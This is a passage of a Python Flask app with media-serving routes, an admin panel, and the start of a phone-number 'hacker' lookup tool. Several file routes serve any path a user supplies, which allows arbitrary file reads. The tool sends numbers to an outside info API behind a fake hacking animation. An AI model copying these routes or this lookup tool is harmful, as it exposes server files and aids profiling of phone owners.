        stream_url = data.get('url', '')
        quality_name = data.get('quality', 'best')
    else:
        full_query = request.query_string.decode('utf-8')
        if full_query.startswith('url='):
            name_idx = full_query.find('&name=')
            quality_idx = full_query.find('&quality=')
            end_idx = len(full_query)
            if name_idx > 0:
                end_idx = min(end_idx, name_idx)
            if quality_idx > 0:
                end_idx = min(end_idx, quality_idx)
            stream_url = urllib.parse.unquote(full_query[4:end_idx])
            quality_name = 'best'
            if quality_idx > 0:
                quality_end = full_query.find('&', quality_idx + 9)
                if quality_end < 0:
                    quality_end = len(full_query)
                quality_name = full_query[quality_idx + 9:quality_end]
        else:
            stream_url = request.args.get('url', '')
            quality_name = request.args.get('quality', 'best')
    
    if not stream_url:
        return jsonify({'error': 'No URL provided'}), 400
    
    is_valid, error_msg = validate_external_url(stream_url)
    if not is_valid:
        return jsonify({'error': error_msg}), 400
    
    job_id = str(uuid.uuid4())[:8]
    download_jobs[job_id] = {
        'id': job_id,
        'status': 'starting',
        'progress': 0,
        'url': stream_url,
        'quality': quality_name,
        'created_at': datetime.now(),
        'total_size': 0,
        'speed': 0,
        'eta': ''
    }
    
    thread = threading.Thread(target=run_download_job, args=(job_id, stream_url, stream_url, quality_name), daemon=True)
    thread.start()
    
    return jsonify({'job_id': job_id, 'status': 'started', 'message': 'Download started'})

@app.route('/api/download/status/<job_id>')
def download_status(job_id):
    job = download_jobs.get(job_id)
    if not job:
        return jsonify({'error': 'Job not found'}), 404
    
    def format_size(size):
        if size >= 1024 * 1024 * 1024:
            return f'{size / (1024 * 1024 * 1024):.2f} GB'
        elif size >= 1024 * 1024:
            return f'{size / (1024 * 1024):.1f} MB'
        elif size >= 1024:
            return f'{size / 1024:.0f} KB'
        return f'{size} B'
    
    def format_speed(speed):
        if speed >= 1024 * 1024:
            return f'{speed / (1024 * 1024):.1f} MB/s'
        elif speed >= 1024:
            return f'{speed / 1024:.0f} KB/s'
        return f'{speed} B/s'
    
    return jsonify({
        'id': job['id'],
        'status': job['status'],
        'progress': round(job.get('progress', 0), 1),
        'total_size': job.get('total_size', 0),
        'total_size_formatted': format_size(job.get('total_size', 0)),
        'file_size': job.get('file_size', 0),
        'file_size_formatted': format_size(job.get('file_size', 0)),
        'speed': job.get('speed', 0),
        'speed_formatted': format_speed(job.get('speed', 0)),
        'eta': job.get('eta', ''),
        'error': job.get('error', ''),
        'quality': job.get('quality', 'best')
    })

@app.route('/api/download/file/<job_id>')
def download_file(job_id):
    job = download_jobs.get(job_id)
    if not job:
        return jsonify({'error': 'Job not found'}), 404
    if job['status'] != 'completed':
        return jsonify({'error': 'Download not completed yet'}), 400
    file_path = job.get('file_path')
    if not file_path or not os.path.exists(file_path):
        return jsonify({'error': 'File not found'}), 404
    quality = job.get('quality', 'video')
    filename = f'video_{quality}_{job_id}.mp4'
    return send_file(file_path, as_attachment=True, download_name=filename, mimetype='video/mp4')

@app.route('/api/download/cancel/<job_id>', methods=['POST'])
def cancel_download(job_id):
    job = download_jobs.get(job_id)
    if not job:
        return jsonify({'error': 'Job not found'}), 404
    if 'process' in job:
        try:
            job['process'].terminate()
        except:
            pass
    job['status'] = 'cancelled'
    if job.get('file_path') and os.path.exists(job['file_path']):
        try:
            os.remove(job['file_path'])
        except:
            pass
    return jsonify({'status': 'cancelled'})

@app.route('/subtitle')
def subtitle():
    file_path = request.args.get('file', '')
    if not file_path: abort(404)
    file_path = urllib.parse.unquote(file_path)
    full_path = Path(file_path)
    try:
        full_path = full_path.resolve()
    except:
        abort(404)
    if not full_path.exists():
        abort(404)
    ext = full_path.suffix.lower()
    try:
        with open(full_path, 'r', encoding='utf-8') as f:
            content = f.read()
    except:
        try:
            with open(full_path, 'r', encoding='latin-1') as f:
                content = f.read()
        except:
            abort(500)
    if ext == '.srt':
        content = convert_srt_to_vtt(content)
    response = Response(content, mimetype='text/vtt')
    response.headers['Content-Type'] = 'text/vtt; charset=utf-8'
    return response

@app.route('/view')
def view_image():
    file_path = request.args.get('file', '')
    if not file_path: abort(404)
    file_path = urllib.parse.unquote(file_path)
    full_path = Path(file_path)
    try:
        full_path = full_path.resolve()
    except:
        abort(404)
    if not full_path.exists(): abort(404)
    return render_template_string(IMAGE_VIEWER_TEMPLATE, file_name=full_path.name, file_path=urllib.parse.quote(str(full_path), safe=''))

@app.route('/audio')
def audio_player():
    file_path = request.args.get('file', '')
    if not file_path: abort(404)
    file_path = urllib.parse.unquote(file_path)
    full_path = Path(file_path)
    try:
        full_path = full_path.resolve()
    except:
        abort(404)
    if not full_path.exists(): abort(404)
    mime_type, _ = mimetypes.guess_type(str(full_path))
    if not mime_type: mime_type = 'audio/mpeg'
    return render_template_string(AUDIO_PLAYER_TEMPLATE, file_name=full_path.name, file_path=urllib.parse.quote(str(full_path), safe=''), mime_type=mime_type)

@app.route('/download')
def download():
    file_path = request.args.get('file', '')
    if not file_path: abort(404)
    file_path = urllib.parse.unquote(file_path)
    full_path = Path(file_path)
    try:
        full_path = full_path.resolve()
    except:
        abort(404)
    if not full_path.exists() or not full_path.is_file(): abort(404)
    return send_file(full_path)

@app.route('/stream')
def stream():
    file_path = request.args.get('file', '')
    if not file_path: abort(404)
    file_path = urllib.parse.unquote(file_path)
    full_path = Path(file_path)
    try:
        full_path = full_path.resolve()
    except:
        abort(404)
    if not full_path.exists(): abort(404)
    file_size = full_path.stat().st_size
    mime_type, _ = mimetypes.guess_type(str(full_path))
    if not mime_type: mime_type = 'video/mp4'
    range_header = request.headers.get('Range', None)
    if range_header:
        byte_start = 0
        byte_end = file_size - 1
        try:
            match = range_header.replace('bytes=', '').split('-')
            if match[0]: byte_start = int(match[0])
            if len(match) > 1 and match[1]: byte_end = int(match[1])
        except:
            abort(416)
        if byte_start >= file_size:
            response = Response(status=416)
            response.headers['Content-Range'] = f'bytes */{file_size}'
            return response
        byte_end = min(byte_end, file_size - 1)
        chunk_size = byte_end - byte_start + 1
        def generate():
            with open(full_path, 'rb') as f:
                f.seek(byte_start)
                remaining = chunk_size
                while remaining > 0:
                    data = f.read(min(65536, remaining))
                    if not data: break
                    remaining -= len(data)
                    yield data
        response = Response(generate(), status=206, mimetype=mime_type, direct_passthrough=True)
        response.headers['Content-Range'] = f'bytes {byte_start}-{byte_end}/{file_size}'
        response.headers['Accept-Ranges'] = 'bytes'
        response.headers['Content-Length'] = chunk_size
        return response
    return send_file(full_path, mimetype=mime_type)

# ================== ADMIN ROUTES ==================

ADMIN_LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
        }
        .login-box {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 20px;
            width: 100%;
            max-width: 400px;
            margin: 20px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #e94560; font-size: 2em; margin-bottom: 10px; }
        .logo p { color: #888; }
        .form-group { margin-bottom: 20px; }
        .form-group input {
            width: 100%;
            padding: 15px;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 10px;
            color: #fff;
            font-size: 1em;
        }
        .btn {
            width: 100%;
            padding: 15px;
            background: #e94560;
            border: none;
            border-radius: 10px;
            color: #fff;
            font-size: 1.1em;
            cursor: pointer;
            transition: all 0.3s;
        }
        .btn:hover { background: #ff6b88; transform: translateY(-2px); }
        .error { color: #ff4444; text-align: center; margin-bottom: 20px; padding: 10px; background: rgba(255,0,0,0.1); border-radius: 8px; }
        .back-link { text-align: center; margin-top: 20px; }
        .back-link a { color: #00ff88; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">
            <h1>🔐 Admin Panel</h1>
            <p>Enter admin password</p>
        </div>
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        <form method="POST">
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required autofocus>
            </div>
            <button type="submit" class="btn">Login</button>
        </form>
        <div class="back-link">
            <a href="/">← Back to Site</a>
        </div>
    </div>
</body>
</html>
'''

SITE_LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Protected</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
        }
        .login-box {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 20px;
            width: 100%;
            max-width: 400px;
            margin: 20px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #e94560; font-size: 2em; margin-bottom: 10px; }
        .logo p { color: #888; }
        .form-group { margin-bottom: 20px; }
        .form-group input {
            width: 100%;
            padding: 15px;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 10px;
            color: #fff;
            font-size: 1em;
        }
        .btn {
            width: 100%;
            padding: 15px;
            background: #e94560;
            border: none;
            border-radius: 10px;
            color: #fff;
            font-size: 1.1em;
            cursor: pointer;
        }
        .error { color: #ff4444; text-align: center; margin-bottom: 20px; padding: 10px; background: rgba(255,0,0,0.1); border-radius: 8px; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">
            <h1>🔒 Site Protected</h1>
            <p>Enter password to continue</p>
        </div>
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        <form method="POST">
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required autofocus>
            </div>
            <button type="submit" class="btn">Enter</button>
        </form>
    </div>
</body>
</html>
'''

ADMIN_DASHBOARD_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a0f;
            min-height: 100vh;
            color: #fff;
        }
        .sidebar {
            position: fixed;
            right: 0;
            top: 0;
            width: 250px;
            height: 100vh;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            padding: 20px;
            border-left: 1px solid rgba(255,255,255,0.1);
        }
        .sidebar-logo {
            color: #e94560;
            font-size: 1.5em;
            font-weight: bold;
            margin-bottom: 40px;
            text-align: center;
        }
        .nav-item {
            display: block;
            padding: 15px 20px;
            color: #888;
            text-decoration: none;
            border-radius: 10px;
            margin-bottom: 5px;
            transition: all 0.2s;
        }
        .nav-item:hover, .nav-item.active { background: rgba(233,69,96,0.2); color: #e94560; }
        .nav-item svg { width: 20px; height: 20px; margin-left: 10px; vertical-align: middle; }
        .main-content { margin-right: 250px; padding: 30px; }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }
        .header h1 { font-size: 1.8em; }
        .logout-btn {
            background: rgba(233,69,96,0.2);
            color: #e94560;
            padding: 10px 20px;
            border-radius: 10px;
            text-decoration: none;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: linear-gradient(135deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0.02) 100%);
            padding: 25px;
            border-radius: 15px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .stat-card h3 { color: #888; font-size: 0.9em; margin-bottom: 10px; }
        .stat-card .value { font-size: 2.5em; font-weight: bold; color: #00ff88; }
        .card {
            background: rgba(255,255,255,0.05);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 20px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .card-header h2 { font-size: 1.3em; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 15px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }
        th { color: #888; font-weight: 500; }
        .badge {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.8em;
        }
        .badge.local { background: rgba(0,255,136,0.2); color: #00ff88; }
        .badge.remote { background: rgba(233,69,96,0.2); color: #e94560; }
        .btn {
            padding: 12px 25px;
            background: #e94560;
            border: none;
            border-radius: 8px;
            color: #fff;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
        @media (max-width: 768px) {
            .sidebar { width: 100%; height: auto; position: relative; }
            .main-content { margin-right: 0; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-logo">🔐 Admin Panel</div>
        <a href="/admin" class="nav-item {{ 'active' if page == 'dashboard' else '' }}">📊 Dashboard</a>
        <a href="/admin/visitors" class="nav-item {{ 'active' if page == 'visitors' else '' }}">👥 Visitors</a>
        <a href="/admin/settings" class="nav-item {{ 'active' if page == 'settings' else '' }}">⚙️ Settings</a>
        <a href="/" class="nav-item">🏠 Back to Site</a>
        <a href="/admin/logout" class="nav-item" style="margin-top: 30px; color: #e94560;">🚪 Logout</a>
    </div>
    
    <div class="main-content">
        <div class="header">
            <h1>{{ title }}</h1>
            <span style="color: #888;">{{ current_time }}</span>
        </div>
        
        {% if page == 'dashboard' %}
        <div class="stats-grid">
            <div class="stat-card"><h3>Total Visits</h3><div class="value">{{ total_visits }}</div></div>
            <div class="stat-card"><h3>Today Visits</h3><div class="value">{{ today_visits }}</div></div>
            <div class="stat-card"><h3>Online Now</h3><div class="value">{{ online_now }}</div></div>
            <div class="stat-card"><h3>Local Visitors</h3><div class="value">{{ local_visitors }}</div></div>
            <div class="stat-card"><h3>Remote Visitors</h3><div class="value">{{ remote_visitors }}</div></div>
            <div class="stat-card"><h3>Unique IPs</h3><div class="value">{{ unique_ips }}</div></div>
        </div>
        
        <div class="card">
            <div class="card-header"><h2>Recent Visitors</h2><a href="/admin/visitors" class="btn">View All</a></div>
            <table>
                <thead><tr><th>IP</th><th>Path</th><th>Type</th><th>Time</th></tr></thead>
                <tbody>
                    {% for v in recent_visitors %}
                    <tr><td>{{ v.ip_address }}</td><td>{{ v.path }}</td><td><span class="badge {{ 'local' if v.is_local else 'remote' }}">{{ 'Local' if v.is_local else 'Remote' }}</span></td><td>{{ v.timestamp }}</td></tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        {% endif %}
        
        {% if page == 'visitors' %}
        <div class="card">
            <div class="card-header"><h2>All Visitors (Last 100)</h2></div>
            <table>
                <thead><tr><th>IP</th><th>Path</th><th>Type</th><th>Time</th></tr></thead>
                <tbody>
                    {% for v in visitors %}
                    <tr><td>{{ v.ip_address }}</td><td>{{ v.path }}</td><td><span class="badge {{ 'local' if v.is_local else 'remote' }}">{{ 'Local' if v.is_local else 'Remote' }}</span></td><td>{{ v.timestamp }}</td></tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        {% endif %}
        
        {% if page == 'settings' %}
        <div class="card">
            <div class="card-header"><h2>Site Protection</h2></div>
            <p>Status: {% if site_protected %}🔒 Enabled{% else %}🔓 Disabled{% endif %}</p>
            <form action="/admin/toggle-protection" method="POST" style="margin-top: 20px;">
                <button type="submit" class="btn">{% if site_protected %}Disable{% else %}Enable{% endif %} Protection</button>
            </form>
        </div>
        
        <div class="card">
            <div class="card-header"><h2>Change Password</h2></div>
            <form action="/admin/change-password" method="POST">
                <div class="form-group" style="margin-bottom: 15px;">
                    <input type="password" name="current_password" placeholder="Current Password" required style="width: 100%; padding: 12px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: #fff;">
                </div>
                <div class="form-group" style="margin-bottom: 15px;">
                    <input type="password" name="new_password" placeholder="New Password" required style="width: 100%; padding: 12px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: #fff;">
                </div>
                <div class="form-group" style="margin-bottom: 15px;">
                    <input type="password" name="confirm_password" placeholder="Confirm New Password" required style="width: 100%; padding: 12px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: #fff;">
                </div>
                <button type="submit" class="btn">Change Password</button>
            </form>
        </div>
        {% endif %}
    </div>
</body>
</html>
'''

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    error = None
    ip = get_visitor_ip()
    if is_login_blocked(ip):
        error = 'Login blocked. Try again in 5 minutes'
        return render_template_string(ADMIN_LOGIN_TEMPLATE, error=error)
    if request.method == 'POST':
        password = request.form.get('password', '')
        if check_password(password):
            record_login_attempt(ip, True)
            session['is_admin'] = True
            session['site_authenticated'] = True
            session.permanent = True
            return redirect(url_for('admin_dashboard'))
        else:
            record_login_attempt(ip, False)
            attempts = login_attempts.get(ip, (0, None))[0]
            remaining = 5 - attempts
            if remaining > 0:
                error = f'Incorrect password. {remaining} attempts remaining'
            else:
                error = 'Login blocked. Try again in 5 minutes'
    return render_template_string(ADMIN_LOGIN_TEMPLATE, error=error)

@app.route('/admin/site-login', methods=['GET', 'POST'])
def site_login():
    error = None
    ip = get_visitor_ip()
    if is_login_blocked(ip):
        error = 'Access blocked. Try again in 5 minutes'
        return render_template_string(SITE_LOGIN_TEMPLATE, error=error)
    if request.method == 'POST':
        password = request.form.get('password', '')
        if check_password(password):
            record_login_attempt(ip, True)
            session['site_authenticated'] = True
            session.permanent = True
            return redirect('/')
        else:
            record_login_attempt(ip, False)
            attempts = login_attempts.get(ip, (0, None))[0]
            remaining = 5 - attempts
            if remaining > 0:
                error = f'Incorrect password. {remaining} attempts remaining'
            else:
                error = 'Access blocked. Try again in 5 minutes'
    return render_template_string(SITE_LOGIN_TEMPLATE, error=error)

@app.route('/admin/logout')
def admin_logout():
    session.pop('is_admin', None)
    return redirect(url_for('admin_login'))

@app.route('/admin')
@admin_required
def admin_dashboard():
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM visitor_logs')
    total_visits = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM visitor_logs WHERE DATE(timestamp) = DATE('now')")
    today_visits = c.fetchone()[0]
    c.execute("SELECT COUNT(DISTINCT session_id) FROM active_sessions WHERE last_seen > datetime('now', '-5 minutes')")
    online_now = c.fetchone()[0]
    c.execute('SELECT COUNT(*) FROM visitor_logs WHERE is_local = 1')
    local_visitors = c.fetchone()[0]
    c.execute('SELECT COUNT(*) FROM visitor_logs WHERE is_local = 0')
    remote_visitors = c.fetchone()[0]
    c.execute('SELECT COUNT(DISTINCT ip_address) FROM visitor_logs')
    unique_ips = c.fetchone()[0]
    c.execute('SELECT * FROM visitor_logs ORDER BY timestamp DESC LIMIT 10')
    recent_visitors = c.fetchall()
    conn.close()
    return render_template_string(ADMIN_DASHBOARD_TEMPLATE, page='dashboard', title='Dashboard', current_time=datetime.now().strftime('%Y-%m-%d %H:%M'), total_visits=total_visits, today_visits=today_visits, online_now=online_now, local_visitors=local_visitors, remote_visitors=remote_visitors, unique_ips=unique_ips, recent_visitors=recent_visitors)

@app.route('/admin/visitors')
@admin_required
def admin_visitors():
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT * FROM visitor_logs ORDER BY timestamp DESC LIMIT 100')
    visitors = c.fetchall()
    conn.close()
    return render_template_string(ADMIN_DASHBOARD_TEMPLATE, page='visitors', title='Visitors Log', current_time=datetime.now().strftime('%Y-%m-%d %H:%M'), visitors=visitors)

@app.route('/admin/settings')
@admin_required
def admin_settings():
    return render_template_string(ADMIN_DASHBOARD_TEMPLATE, page='settings', title='Settings', current_time=datetime.now().strftime('%Y-%m-%d %H:%M'), site_protected=is_site_protected())

@app.route('/admin/toggle-protection', methods=['POST'])
@admin_required
def toggle_protection():
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT site_protection_enabled FROM admin_settings WHERE id = 1')
    current = c.fetchone()[0]
    new_value = 0 if current else 1
    c.execute('UPDATE admin_settings SET site_protection_enabled = ?, updated_at = CURRENT_TIMESTAMP WHERE id = 1', (new_value,))
    conn.commit()
    conn.close()
    return redirect(url_for('admin_settings'))

@app.route('/admin/change-password', methods=['POST'])
@admin_required
def change_password():
    current_password = request.form.get('current_password', '')
    new_password = request.form.get('new_password', '')
    confirm_password = request.form.get('confirm_password', '')
    if not check_password(current_password):
        return redirect(url_for('admin_settings'))
    if new_password != confirm_password:
        return redirect(url_for('admin_settings'))
    if len(new_password) < 4:
        return redirect(url_for('admin_settings'))
    conn = get_db()
    c = conn.cursor()
    c.execute('UPDATE admin_settings SET password_hash = ?, updated_at = CURRENT_TIMESTAMP WHERE id = 1', (generate_password_hash(new_password, method='pbkdf2:sha256'),))
    conn.commit()
    conn.close()
    return redirect(url_for('admin_settings'))

# ==================== MAURYA HACKER TOOL ====================

class MauryaColors:
    RED = '\033[91m'
    BRIGHT_RED = '\033[91;1m'
    DARK_RED = '\033[31m'
    GREEN = '\033[92m'
    BRIGHT_GREEN = '\033[92;1m'
    YELLOW = '\033[93m'
    BRIGHT_YELLOW = '\033[93;1m'
    BLUE = '\033[94m'
    BRIGHT_BLUE = '\033[94;1m'
    MAGENTA = '\033[95m'
    BRIGHT_MAGENTA = '\033[95;1m'
    CYAN = '\033[96m'
    BRIGHT_CYAN = '\033[96;1m'
    WHITE = '\033[97m'
    PURPLE = '\033[35m'
    ORANGE = '\033[33m'
    PINK = '\033[95m'
    BOLD = '\033[1m'
    BLINK = '\033[5m'
    END = '\033[0m'

MAURYA_RAINBOW_COLORS = [
    MauryaColors.RED, MauryaColors.BRIGHT_RED, MauryaColors.ORANGE, MauryaColors.YELLOW, 
    MauryaColors.BRIGHT_YELLOW, MauryaColors.GREEN, MauryaColors.BRIGHT_GREEN, 
    MauryaColors.CYAN, MauryaColors.BRIGHT_CYAN, MauryaColors.BLUE, MauryaColors.BRIGHT_BLUE,
    MauryaColors.MAGENTA, MauryaColors.BRIGHT_MAGENTA, MauryaColors.PURPLE, MauryaColors.PINK,
]

MAURYA_ASCII_BANNER = f"""
{MauryaColors.BRIGHT_RED}╔══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                          ║
║  {MauryaColors.WHITE}███╗   ███╗ █████╗ ██╗   ██╗██████╗ ██╗   ██╗ █████╗ {MauryaColors.BRIGHT_RED}                      ║
║  {MauryaColors.PINK}████╗ ████║██╔══██╗██║   ██║██╔══██╗╚██╗ ██╔╝██╔══██╗{MauryaColors.BRIGHT_RED}                      ║
║  {MauryaColors.WHITE}██╔████╔██║███████║██║   ██║██████╔╝ ╚████╔╝ ███████║{MauryaColors.BRIGHT_RED}                      ║
║  {MauryaColors.BLUE}██║╚██╔╝██║██╔══██║██║   ██║██╔══██╗  ╚██╔╝  ██╔══██║{MauryaColors.BRIGHT_RED}                      ║
║  {MauryaColors.GREEN}██║ ╚═╝ ██║██║  ██║╚██████╔╝██║  ██║   ██║   ██║  ██║{MauryaColors.BRIGHT_RED}                      ║
║  {MauryaColors.WHITE}╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝{MauryaColors.BRIGHT_RED}                      ║
║                                                                                          ║
║  {MauryaColors.RED}██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ {MauryaColors.BRIGHT_RED}                           ║
║  {MauryaColors.YELLOW}██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗{MauryaColors.BRIGHT_RED}                           ║
║  {MauryaColors.WHITE}███████║███████║██║     █████╔╝ █████╗  ██████╔╝{MauryaColors.BRIGHT_RED}                           ║
║  {MauryaColors.RED}██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗{MauryaColors.BRIGHT_RED}                           ║
║  {MauryaColors.PINK}██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║{MauryaColors.BRIGHT_RED}                           ║
║  {MauryaColors.RED}╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{MauryaColors.BRIGHT_RED}                           ║
║                                                                                          ║
║              {MauryaColors.YELLOW}🔴 MAURYA HACKER FRAMEWORK v3.0 🔴{MauryaColors.BRIGHT_RED}                                   ║
║                   {MauryaColors.CYAN}NUMBER INFORMATION EXPLOIT{MauryaColors.BRIGHT_RED}                                            ║
╚══════════════════════════════════════════════════════════════════════════════════════╝{MauryaColors.END}
"""

class MauryaHackerTool:
    def __init__(self):
        self.apis = {}
        self.votes = {}
        self.history = []
        self.votes_file = "votes.json"
        self.history_file = "history.json"
        self.load_all_apis()
        self.load_votes()
        self.load_history()
    
    def clear(self):
        os.system('clear')
    
    def color_text(self, text, color, blink=False, bold=False):
        style = ""
        if blink:
            style += MauryaColors.BLINK
        if bold:
            style += MauryaColors.BOLD
        return f"{style}{color}{text}{MauryaColors.END}"
    
    def rainbow_line(self, text, blink=False, bold=False):
        words = text.split(' ')
        result = ""
        for i, word in enumerate(words):
            word_color = MAURYA_RAINBOW_COLORS[i % len(MAURYA_RAINBOW_COLORS)]
            style = ""
            if blink:
                style += MauryaColors.BLINK
            if bold:
                style += MauryaColors.BOLD
            
            colored_word = ""
            for j, char in enumerate(word):
                char_color = MAURYA_RAINBOW_COLORS[(i + j) % len(MAURYA_RAINBOW_COLORS)]
                colored_word += f"{style}{char_color}{char}{MauryaColors.END}"
            
            result += colored_word
            if i < len(words) - 1:
                result += " "
        return result
    
    def print_banner(self):
        print(MAURYA_ASCII_BANNER)
    
    def print_success(self, text):
        print(self.rainbow_line(f"✅ {text}", False, True))
    
    def print_error(self, text):
        print(self.color_text(f"❌ {text}", MauryaColors.BRIGHT_RED, True, True))
    
    def print_mixed_color_tag(self):
        tag_text = "MAURYA JI FROM UTTAR PRADESH"
        print(self.color_text("\n╔" + "═"*66 + "╗", MauryaColors.BRIGHT_RED, True, True))
        
        colored_tag = ""
        for i, char in enumerate(tag_text):
            color = MAURYA_RAINBOW_COLORS[i % len(MAURYA_RAINBOW_COLORS)]
            colored_tag += self.color_text(char, color, True, True)
        
        spaces = 66 - len(tag_text) - 4
        if spaces < 0:
            spaces = 0
        print(f"{self.color_text('║', MauryaColors.BRIGHT_RED)}  {colored_tag}" + " " * spaces + self.color_text("║", MauryaColors.BRIGHT_RED))
        print(self.color_text("╚" + "═"*66 + "╝", MauryaColors.BRIGHT_RED, True, True))
    
    def maurya_animation(self, number):
        print(self.color_text("\n" + "═"*70, MauryaColors.BRIGHT_RED, True, True))
        print(self.rainbow_line("🔥 MAURYA HACKER EXPLOIT SEQUENCE INITIATED 🔥", True, True))
        print(self.color_text("═"*70, MauryaColors.BRIGHT_RED, True, True))
        
        for i in range(3):
            print(self.color_text(f"\r[🔥] MAURYA HACKER LOADING" + "." * i, MauryaColors.RED, True, True), end="")
            time.sleep(0.4)
        
        print("\n")
        
        exploits = [
            "🔥 MAURYA HACKER BYPASSING FIREWALLS",
            "🔥 MAURYA HACKER DECRYPTING PROTOCOLS",
            "🔥 MAURYA HACKER ACCESSING DATABASE",
            "🔥 MAURYA HACKER EVADING DETECTION",
            "🔥 MAURYA HACKER EXTRACTING TARGET DATA"
        ]
        
        for exploit in exploits:
            print(self.rainbow_line(f"  {exploit}", True, True))
            time.sleep(0.3)
        
        print(self.rainbow_line("\n>>> MAURYA HACKER ACCESSING MAINFRAME <<<", True, True))
        for i in range(20):
            random_chars = ''.join(random.choice('█▓▒░') for _ in range(60))
            print(self.color_text(f"\r[{random_chars}] MAURYA DECODING..." + "." * (i%3), MauryaColors.DARK_RED), end="")
            time.sleep(0.03)
        
        print(self.rainbow_line("\n\n✅ MAURYA HACKER ACCESS GRANTED", True, True))
        print(self.rainbow_line(f"🎯 TARGET NUMBER: {number}", True, True))
        print(self.color_text("═"*70, MauryaColors.BRIGHT_RED, True, True))
        time.sleep(1)
    
    def load_all_apis(self):
        # ==================== API DALI GAYI HAI YAHAN ====================
        self.apis = {
    "1": {
        "name": "📱 ANSH NUMBER INFO",
        "url": "https://ansh-apis.is-dev.org/api/anu",
        "params": {"key": "ansh", "num": ""},
        "category": "Phone"
    }
}
        # ================================================================
        
        for key in self.apis:
            if key not in self.votes:
                self.votes[key] = 0
    
    def load_votes(self):
        try:
            if os.path.exists(self.votes_file):
                with open(self.votes_file, 'r') as f:
                    self.votes = json.load(f)
        except:
            pass
    
    def save_votes(self):
        try:
            with open(self.votes_file, 'w') as f:
                json.dump(self.votes, f, indent=2)
        except:
            pass
    
    def load_history(self):
        try:
            if os.path.exists(self.history_file):
                with open(self.history_file, 'r') as f:
                    self.history = json.load(f)
        except:
            self.history = []
    
    def save_history(self):
        try:
            self.history = self.history[-100:]
            with open(self.history_file, 'w') as f:
                json.dump(self.history, f, indent=2)
        except:
            pass
    
    def add_to_history(self, api_name, query, result):
        self.history.append({
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "api": api_name,
            "query": query,
            "result": result[:500]
        })
        self.save_history()
    
    def print_header(self):
        self.print_banner()
